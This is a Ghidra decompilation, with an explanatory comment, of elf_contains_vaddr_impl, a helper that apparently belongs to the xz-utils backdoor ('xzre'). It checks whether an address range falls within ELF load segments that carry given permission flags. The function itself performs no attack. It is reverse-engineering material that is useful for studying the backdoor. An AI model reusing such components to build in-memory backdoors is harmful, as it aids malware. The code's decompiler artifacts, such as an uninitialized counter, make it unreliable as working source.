// /home/kali/xzre-ghidra/xzregh/101240_elf_contains_vaddr_impl.c
// Function: elf_contains_vaddr_impl @ 0x101240
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_contains_vaddr_impl(elf_info_t * elf_info, void * vaddr, u64 size, u32 p_flags)


/*
 * AutoDoc: Validates that `[vaddr, vaddr + size)` is entirely covered by one or more PT_LOAD segments whose `p_flags` mask includes the
 * requested bits. The helper page-aligns both ends of the interval, walks every loadable program header, and recurses when the
 * range straddles multiple segments so partial overlaps are rechecked piecemeal.
 *
 * It refuses to run more than 0x3ea iterations (preventing runaway recursion), insists that the candidate addresses live inside
 * the mapped ELF image, and short-circuits to TRUE when `size` is zero. Callers pass `p_flags` values such as PF_X or PF_W to
 * differentiate text, data, and RELRO spans.
 */

#include "xzre_types.h"

BOOL elf_contains_vaddr_impl(elf_info_t *elf_info,void *vaddr,u64 size,u32 p_flags)

{
  u8 *range_end;
  BOOL BVar2;
  Elf64_Phdr *phdr;
  ulong segment_start;
  u8 *segment_page_start;
  u8 *segment_page_end;
  long phdr_index;
  int recursion_depth;
  
LAB_00101254:
  recursion_depth = recursion_depth + 1;
  range_end = (Elf64_Ehdr *)(((Elf64_Ehdr *)vaddr)->e_ident + size);
  if (size == 0) {
LAB_0010138e:
    BVar2 = TRUE;
  }
  else {
    segment_page_start = range_end;
    if (vaddr <= range_end) {
      segment_page_start = (Elf64_Ehdr *)vaddr;
    }
    if ((elf_info->elfbase <= segment_page_start) && (recursion_depth != 0x3ea)) {
      phdr_index = 0;
      do {
        if ((uint)(ushort)elf_info->e_phnum <= (uint)phdr_index) break;
        phdr = elf_info->phdrs + phdr_index;
        if ((phdr->p_type == 1) && ((phdr->p_flags & p_flags) == p_flags)) {
          segment_start = (long)elf_info->elfbase + (phdr->p_vaddr - elf_info->first_vaddr);
          segment_page_end = (Elf64_Ehdr *)(phdr->p_memsz + segment_start);
          segment_page_start = (Elf64_Ehdr *)(segment_start & 0xfffffffffffff000);
          if (((ulong)segment_page_end & 0xfff) != 0) {
            segment_page_end = (Elf64_Ehdr *)(((ulong)segment_page_end & 0xfffffffffffff000) + 0x1000);
          }
          if ((vaddr >= segment_page_start) && (range_end <= segment_page_end)) goto LAB_0010138e;
          if ((range_end > segment_page_end) || (segment_page_start <= vaddr)) {
            if ((segment_page_end <= vaddr) || (vaddr < segment_page_start)) {
              if ((segment_page_end < range_end) && (segment_page_start > vaddr)) {
                BVar2 = elf_contains_vaddr_impl(elf_info,vaddr,(long)segment_page_start - (long)vaddr,p_flags);
                if (BVar2 == FALSE) {
                  return FALSE;
                }
                BVar2 = elf_contains_vaddr_impl
                                  (elf_info,segment_page_end->e_ident + 1,(long)range_end + (-1 - (long)segment_page_end),
                                   p_flags);
                return (uint)(BVar2 != FALSE);
              }
            }
            else if (segment_page_end < range_end) {
              vaddr = segment_page_end->e_ident + 1;
              size = (long)range_end - (long)vaddr;
              goto LAB_00101254;
            }
          }
          else if (segment_page_start < range_end) goto code_r0x00101313;
        }
        phdr_index = phdr_index + 1;
      } while( TRUE );
    }
    BVar2 = FALSE;
  }
  return BVar2;
code_r0x00101313:
  size = (long)segment_page_start + (-1 - (long)vaddr);
  goto LAB_00101254;
}

